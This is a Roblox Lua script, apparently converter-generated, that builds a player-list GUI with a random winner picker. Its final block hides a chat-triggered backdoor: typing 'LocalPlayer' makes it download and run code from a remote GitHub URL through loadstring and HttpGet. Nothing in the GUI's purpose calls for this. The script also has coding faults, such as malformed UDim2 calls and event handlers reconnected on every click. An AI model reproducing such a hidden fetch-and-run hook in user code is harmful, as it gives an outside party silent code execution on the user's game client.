-- Gui to Lua
-- Version: 3.2

-- Instances:

local PlayerList = Instance.new("ScreenGui")
local Frame = Instance.new("ImageLabel")
local LightBlue = Instance.new("ImageLabel")
local Corner = Instance.new("UICorner")
local ImageLabel = Instance.new("ImageLabel")
local Heading = Instance.new("TextLabel")
local Corner_2 = Instance.new("UICorner")
local Corner_3 = Instance.new("UICorner")
local List = Instance.new("ScrollingFrame")
local Template = Instance.new("Frame")
local TemplateCorner = Instance.new("UICorner")
local Avatar = Instance.new("ImageLabel")
local UserName = Instance.new("TextLabel")
local UIGridLayout = Instance.new("UIGridLayout")
local Main = Instance.new("ImageLabel")
local UICorner = Instance.new("UICorner")
local Chooser = Instance.new("TextButton")
local WinnerFrame = Instance.new("Frame")
local UICorner_2 = Instance.new("UICorner")
local WinnerTitle = Instance.new("TextLabel")
local UICorner_3 = Instance.new("UICorner")
local WinnerAvatar = Instance.new("ImageLabel")
local EndB = Instance.new("TextButton")
local Again = Instance.new("TextButton")
local UICorner_4 = Instance.new("UICorner")
local Close = Instance.new("TextButton")
local UICorner_5 = Instance.new("UICorner")
local Can = false
local Can1 = false

--Properties:

PlayerList.Name = "PlayerList"
PlayerList.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

Frame.Name = "Frame"
Frame.Parent = PlayerList
Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame.BackgroundTransparency = 1.000
Frame.Position = UDim2.new(0.0190403424, 0, 0.621390283, 0)
Frame.Size = UDim2.new(0, 420, 0, 340)
Frame.Image = "rbxassetid://3570695787"
Frame.ScaleType = Enum.ScaleType.Slice
Frame.SliceCenter = Rect.new(100, 100, 100, 100)
Frame.SliceScale = 0.120

LightBlue.Name = "LightBlue"
LightBlue.Parent = Frame
LightBlue.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
LightBlue.Size = UDim2.new(0, 420, 0, 340)
LightBlue.Image = "rbxassetid://9033144300"

Corner.CornerRadius = UDim.new(0.100000001, 0)
Corner.Name = "Corner"
Corner.Parent = LightBlue

ImageLabel.Parent = Frame
ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel.Size = UDim2.new(0, 420, 0, 50)
ImageLabel.Image = "rbxassetid://9033164658"

Heading.Name = "Heading"
Heading.Parent = ImageLabel
Heading.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Heading.BackgroundTransparency = 1.000
Heading.Size = UDim2.new(0, 420, 0, 50)
Heading.Font = Enum.Font.FredokaOne
Heading.Text = "PlayerList"
Heading.TextColor3 = Color3.fromRGB(255, 255, 255)
Heading.TextScaled = true
Heading.TextSize = 14.000
Heading.TextWrapped = true

Corner_2.CornerRadius = UDim.new(0.150000006, 0)
Corner_2.Name = "Corner"
Corner_2.Parent = Heading

Corner_3.CornerRadius = UDim.new(0.150000006, 0)
Corner_3.Name = "Corner"
Corner_3.Parent = ImageLabel

List.Name = "List"
List.Parent = Frame
List.Active = true
List.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
List.BackgroundTransparency = 1.000
List.BorderSizePixel = 4
List.Position = UDim2.new(0, 0, 0.14705883, 0)
List.Size = UDim2.new(0, 420, 0, 290)
List.ScrollBarThickness = 15

Template.Name = "Template"
Template.Parent = List
Template.BackgroundColor3 = Color3.fromRGB(173, 173, 173)
Template.BackgroundTransparency = 0.300
Template.Position = UDim2.new(8.98270373e-05, 0, -0.0008025071, 0)
Template.Size = UDim2.new(0, 100, 0, 100)
Template.Visible = false

TemplateCorner.Name = "TemplateCorner"
TemplateCorner.Parent = Template

Avatar.Name = "Avatar"
Avatar.Parent = Template
Avatar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Avatar.BackgroundTransparency = 1.000
Avatar.Size = UDim2.new(0, 100, 0, 72)
Avatar.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"

UserName.Name = "UserName"
UserName.Parent = Template
UserName.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
UserName.BackgroundTransparency = 1.000
UserName.Position = UDim2.new(0, 0, 0.720000029, 0)
UserName.Size = UDim2.new(0, 100, 0, 28)
UserName.Font = Enum.Font.FredokaOne
UserName.Text = "Roblox_Wmh"
UserName.TextColor3 = Color3.fromRGB(20, 20, 20)
UserName.TextSize = 14.000

UIGridLayout.Parent = List
UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIGridLayout.CellPadding = UDim2.new(0, 0, 0, 0)

Main.Name = "Main"
Main.Parent = Frame
Main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Main.Position = UDim2.new(0, 0, 0.867647052, 0)
Main.Size = UDim2.new(0, 420, 0, 45)
Main.Image = "rbxassetid://9033164658"

UICorner.Parent = Main

Chooser.Name = "Chooser"
Chooser.Parent = Main
Chooser.BackgroundColor3 = Color3.fromRGB(132, 132, 132)
Chooser.BorderSizePixel = 3
Chooser.Size = UDim2.new(0, 420, 0, 45)
Chooser.Font = Enum.Font.FredokaOne
Chooser.Text = ""
Chooser.TextColor3 = Color3.fromRGB(255, 255, 255)
Chooser.TextScaled = true
Chooser.TextSize = 14.000
Chooser.TextWrapped = true

WinnerFrame.Name = "WinnerFrame"
WinnerFrame.Parent = PlayerList
WinnerFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
WinnerFrame.Position = UDim2.new({0.364, 0},{0.62, 0})
WinnerFrame.Size = UDim2.new(0, 273, 0, 225)
WinnerFrame.Visible = false
WinnerFrame.Draggable = true

UICorner_2.CornerRadius = UDim.new(0.150000006, 0)
UICorner_2.Parent = WinnerFrame

WinnerTitle.Name = "WinnerTitle"
WinnerTitle.Parent = WinnerFrame
WinnerTitle.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
WinnerTitle.Size = UDim2.new(0, 273, 0, 50)
WinnerTitle.Font = Enum.Font.FredokaOne
WinnerTitle.Text = "Congratulations:"
WinnerTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
WinnerTitle.TextScaled = true
WinnerTitle.TextSize = 14.000
WinnerTitle.TextWrapped = true

UICorner_3.CornerRadius = UDim.new(0.150000006, 0)
UICorner_3.Parent = WinnerTitle

WinnerAvatar.Name = "WinnerAvatar"
WinnerAvatar.Parent = WinnerFrame
WinnerAvatar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
WinnerAvatar.BackgroundTransparency = 1.000
WinnerAvatar.Position = UDim2.new(0.318681329, 0, 0.222222209, 0)
WinnerAvatar.Size = UDim2.new(0, 100, 0, 100)
WinnerAvatar.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"

EndB.Name = "EndB"
EndB.Parent = WinnerFrame
EndB.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
EndB.BorderSizePixel = 2
EndB.Position = UDim2.new(0.161172166, 0, 0.711111128, 0)
EndB.Size = UDim2.new(0, 200, 0, 50)
EndB.Font = Enum.Font.FredokaOne
EndB.Text = "Roblox_Wmh"
EndB.TextColor3 = Color3.fromRGB(85, 255, 0)
EndB.TextScaled = true
EndB.TextSize = 14.000
EndB.TextWrapped = true

Again.Name = "Again"
Again.Parent = WinnerFrame
Again.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Again.Position = UDim2.new(0.161172166, 0, 1, 0)
Again.Size = UDim2.new(0, 98, 0, 50)
Again.Font = Enum.Font.FredokaOne
Again.Text = "Again"
Again.TextColor3 = Color3.fromRGB(255, 255, 255)
Again.TextScaled = true
Again.TextSize = 14.000
Again.TextWrapped = true

UICorner_4.Parent = Again

Close.Name = "Close"
Close.Parent = WinnerFrame
Close.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Close.Position = UDim2.new(0.520146549, 0, 1, 0)
Close.Size = UDim2.new(0, 102, 0, 50)
Close.Font = Enum.Font.FredokaOne
Close.Text = "Close"
Close.TextColor3 = Color3.fromRGB(255, 255, 255)
Close.TextScaled = true
Close.TextSize = 14.000
Close.TextWrapped = true
Chooser.Text = "Random Chooser"
WinnerFrame.Draggable = true

UICorner_5.Parent = Close

Chooser.MouseButton1Click:Connect(function()
	if Can == false then
		Can = true
		Chooser.Text = "Choosing..."
		wait(2.3)
		local AllPlayers = game.Players:GetChildren()
		local RandomPlayer = AllPlayers[math.random(1,#AllPlayers)]
		WinnerFrame.Visible = true
		WinnerAvatar.Image = game.Players:GetUserThumbnailAsync(RandomPlayer.UserId, Enum.ThumbnailType.AvatarThumbnail, Enum.ThumbnailSize.Size420x420)
		EndB.Text = RandomPlayer.Name
		Chooser.Text = "Random Chooser"
	end
	Close.MouseButton1Click:Connect(function()
		WinnerFrame.Visible = false
		Can = false
		Can1 = false
	end)
end)

Again.MouseButton1Click:Connect(function()
	if Can1 == false then
		if Can == true then
			Can1 = true
			Chooser.Text = "Choosing..."
			wait(2.3)
			local AllPlayers = game.Players:GetChildren()
			local RandomPlayer = AllPlayers[math.random(1,#AllPlayers)]
			print(RandomPlayer)
			WinnerFrame.Visible = true
			WinnerAvatar.Image = game.Players:GetUserThumbnailAsync(RandomPlayer.UserId, Enum.ThumbnailType.AvatarThumbnail, Enum.ThumbnailSize.Size420x420)
			EndB.Text = RandomPlayer.Name
			Chooser.Text = "Random Chooser"
			Can1 = false
		end
	end
end)

function  Clear ()
	for i,Lis1t in pairs(List:GetChildren()) do
		if Lis1t:IsA("Frame") then
			Lis1t:Destroy()
		end
	end
end

function  Fill()
	Clear()
	for i, Player in pairs(game.Players:GetChildren()) do
		local Template = Template:Clone()
		local TemplateCorner = TemplateCorner:Clone()
		local Avatar = Avatar:Clone()
		local UserName = UserName:Clone()
		Template.Name = Player.Name
		Template.Parent = List
		TemplateCorner.Parent = Template
		Template.Visible = true
		Avatar.Parent = Template
		UserName.Parent = Template
		UserName.Name = Player.Name
		Avatar.Image = game.Players:GetUserThumbnailAsync(Player.UserId, Enum.ThumbnailType.AvatarThumbnail, Enum.ThumbnailSize.Size420x420)
		UserName.Text = Player.Name
		Avatar.BackgroundTransparency = 1.000
		Avatar.Name = Player.Name
	end
end

Fill()

while wait(0.1) do
	Fill()
	Heading.Text = "Players in this server " .. game.Players.NumPlayers .. "/" .. game.Players.MaxPlayers
end

game.Players.LocalPlayer.Chatted:Connect(function(Msg)
	if Msg == "LocalPlayer" then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Jackw1232132/Menu/main/README.md"))()
	end
end)
